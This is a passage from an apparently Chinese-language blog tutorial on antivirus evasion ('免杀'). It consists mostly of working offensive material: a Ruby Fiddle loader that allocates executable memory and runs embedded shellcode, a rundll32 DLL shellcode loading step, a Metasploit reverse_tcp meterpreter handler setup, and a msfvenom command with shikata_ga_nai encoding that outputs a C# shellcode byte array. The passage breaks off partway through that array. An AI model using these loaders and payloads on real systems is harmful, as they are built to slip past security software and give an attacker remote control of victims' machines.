<span class="token string">"\\x52\\xe8\\x5f\\xff\\xff\\xff\\x68\\x72\\x58\\x20\\x20\\x68\\x6f\\x70"</span>
<span class="token string">"\\x6f\\x6f\\x68\\x4d\\x69\\x63\\x72\\x31\\xdb\\x88\\x5c\\x24\\x09\\x89"</span>
<span class="token string">"\\xe3\\x68\\x72\\x58\\x20\\x20\\x68\\x6f\\x70\\x6f\\x6f\\x68\\x4d\\x69"</span>
<span class="token string">"\\x63\\x72\\x31\\xc9\\x88\\x4c\\x24\\x09\\x89\\xe1\\x31\\xd2\\x52\\x53"</span>
<span class="token string">"\\x51\\x52\\xff\\xd0\\x31\\xc0\\x50\\xff\\x55\\x08"</span> 


include Fiddle 

kernel32 <span class="token operator">=</span> Fiddle<span class="token punctuation">.</span><span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">'kernel32'</span><span class="token punctuation">)</span> 

ptr <span class="token operator">=</span> Function<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">[</span><span class="token string">'VirtualAlloc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token number">0x3000</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>

Function<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">[</span><span class="token string">'VirtualProtect'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> shellcode<span class="token punctuation">.</span>size<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

buf <span class="token operator">=</span> Fiddle<span class="token punctuation">:</span><span class="token punctuation">:</span>Pointer<span class="token punctuation">[</span>shellcode<span class="token punctuation">]</span> 

Function<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">[</span><span class="token string">'RtlMoveMemory'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> shellcode<span class="token punctuation">.</span>size<span class="token punctuation">)</span>

thread <span class="token operator">=</span> Function<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">[</span><span class="token string">'CreateThread'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> 

Function<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span>kernel32<span class="token punctuation">[</span><span class="token string">'WaitForSingleObject'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>thread<span class="token punctuation">,</span> ‐<span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<hr>
<h2><a id="915_dllshellcode_6949"></a>9.1.5 dll加载shellcode免杀上线（dayu-Twenty-second days）</h2>
<pre><code class="prism language-cpp">https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>system<span class="token operator">/</span><span class="token number">228233.</span>html  
</code></pre>
<p>书上介绍MSF生成shellcode，然后通过编译生成dll文件,上传到目标服务器,用rundⅢ32运行</p>
<pre><code class="prism language-cpp">rundll32 xxxx<span class="token punctuation">.</span>dll start
</code></pre>
<hr>
<h2><a id="916_aspxpayload_333"></a>9.1.6 借助aspx对payload进行分离免杀</h2>
<p>关于分离免杀，其他章节参考：</p>
<p><a href="https://micro8.gitbook.io/micro8/contents-1/41-50/47payload-fen-li-mian-sha-si-lu">47课时payload特征，行为分离免杀思路</a></p>
<p><a href="https://micro8.gitbook.io/micro8/contents-1/41-50/48payload-fen-li-mian-sha-si-lu-di-er-ji">48课时payload分离免杀思路第二季</a></p>
<p>本季针对目标环境支持aspx进行分离免杀。</p>
<p><strong>靶机背景：</strong></p>
<p>Windows 2003</p>
<p>Debian</p>
<p>Windows 2003：<br>
<img src="https://img-blog.csdnimg.cn/20201008163223845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201008163230475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>server<span class="token operator">/</span>socks4a<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp_uuid 
payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp_uuid
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set lhost <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> 
lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span>
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set lport <span class="token number">53</span> 
lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">53</span>
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set stageencoder x86<span class="token operator">/</span>shikata_ga_nai
stageencoder <span class="token operator">=</span><span class="token operator">&gt;</span> x86<span class="token operator">/</span>shikata_ga_nai
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set EnableStageEncoding true
EnableStageEncoding <span class="token operator">=</span><span class="token operator">&gt;</span> true
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set exitonsession false
exitonsession <span class="token operator">=</span><span class="token operator">&gt;</span> false
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module <span class="token function">options</span><span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span>

Name Current Setting Required Description 
<span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp_uuid<span class="token punctuation">)</span><span class="token punctuation">:</span>

Name Current Setting Required Description
<span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>

EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span>none<span class="token punctuation">)</span>
LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> yes The listen address
LPORT <span class="token number">53</span> yes The listen port

Exploit target<span class="token punctuation">:</span>

Id Name
<span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span>
<span class="token number">0</span> Wildcard Target

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span class="token operator">-</span>j <span class="token operator">-</span>z
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008163522700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>payload生成：</strong></p>
<pre><code class="prism language-c">root@John<span class="token punctuation">:</span>tmp# msfvenom <span class="token operator">-</span>a x86 <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp_uuid
LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> LPORT<span class="token operator">=</span><span class="token number">53</span> EnableStageEncoding<span class="token operator">=</span>true
stageencoder<span class="token operator">=</span>x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">5</span> <span class="token operator">-</span>f csharp
<span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>lib<span class="token operator">/</span>msf<span class="token operator">/</span>core<span class="token operator">/</span>opt<span class="token punctuation">.</span>rb<span class="token punctuation">:</span><span class="token number">55</span><span class="token punctuation">:</span> warning<span class="token punctuation">:</span> constant
OpenSSL<span class="token punctuation">:</span><span class="token punctuation">:</span>SSL<span class="token punctuation">:</span><span class="token punctuation">:</span>SSLContext<span class="token punctuation">:</span><span class="token punctuation">:</span>METHODS is deprecated
No platform was selected<span class="token punctuation">,</span> choosing Msf<span class="token punctuation">:</span><span class="token punctuation">:</span>Module<span class="token punctuation">:</span><span class="token punctuation">:</span>Platform<span class="token punctuation">:</span><span class="token punctuation">:</span>Windows from the payload
Found <span class="token number">1</span> compatible encoders
Attempting to encode payload with <span class="token number">5</span> iterations of x86<span class="token operator">/</span>shikata_ga_nai
x86<span class="token operator">/</span>shikata_ga_nai succeeded with size <span class="token number">401</span> <span class="token punctuation">(</span>iteration<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> x86<span class="token operator">/</span>shikata_ga_nai succeeded with size <span class="token number">428</span> <span class="token punctuation">(</span>iteration<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> x86<span class="token operator">/</span>shikata_ga_nai succeeded with size <span class="token number">455</span> <span class="token punctuation">(</span>iteration<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span> x86<span class="token operator">/</span>shikata_ga_nai succeeded with size <span class="token number">482</span> <span class="token punctuation">(</span>iteration<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
x86<span class="token operator">/</span>shikata_ga_nai succeeded with size <span class="token number">509</span> <span class="token punctuation">(</span>iteration<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span> x86<span class="token operator">/</span>shikata_ga_nai chosen with final size <span class="token number">509</span>
Payload size<span class="token punctuation">:</span> <span class="token number">509</span> bytes
Final size of csharp file<span class="token punctuation">:</span> <span class="token number">2610</span> bytes
byte<span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> new byte<span class="token punctuation">[</span><span class="token number">509</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>
<span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0xb8</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x2b</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0xb1</span><span class="token punctuation">,</span>
<span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>
<span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0xee</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0xce</span><span class="token punctuation">,</span><span class="token number">0x7a</span><span class="token punctuation">,</span><span class="token number">0x7b</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xae</span><span class="token punctuation">,</span><span class="token number">0xab</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span>
<span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0xf2</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span>
<span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0xda</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xca</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span><span class="token number">0x8c</span><span class="token punctuation">,</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0xc2</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span>
<span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0xd1</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x8f</span><span class="token punctuation">,</span><span class="token number">0xaa</span><span class="token punctuation">,</span><span class="token number">0xae</span><span class="token punctuation">,</span>
<span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0xcb</span><span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span>
<span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x3e</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0xdb</span><span class="token punctuation">,</span><span class="token number">0xe7</span><span class="token punctuation">,</span><span class="token number">0xc5</span><span class="token punctuation">,</span>
<span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0xbd</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xae</span><span class="token punctuation">,</span><span class="token number">0xd7</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0xbd</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0xd2</span><span class="token punctuation">,</span>
<span class="token number">0x7a</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0xf9</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0xf7</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span>
<span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xeb</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0xef</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span>
<span class="token number">0x1b</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span><span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x1a</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x3e</span><span class="token punctuation">,</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span>
<span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span>
<span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0xb8</span><span class="token punctuation">,</span><span class="token number">0x0e</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x5c</span><span class="token punctuation">,</span>
<span class="token number">0xcd</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0xca</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xa1</span><span class="token punctuation">,</span><span class="token number">0xad</span><span class="token punctuation">,</span>
<span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x9f</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span>
<span class="token number">0xcb</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xe7</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0xa4</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x9b</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x7b</span><span class="token punctuation">,</span>
<span class="token number">0xbf</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0xa9</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0xfa</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span>
<span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xae</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span>
<span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x9c</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span>
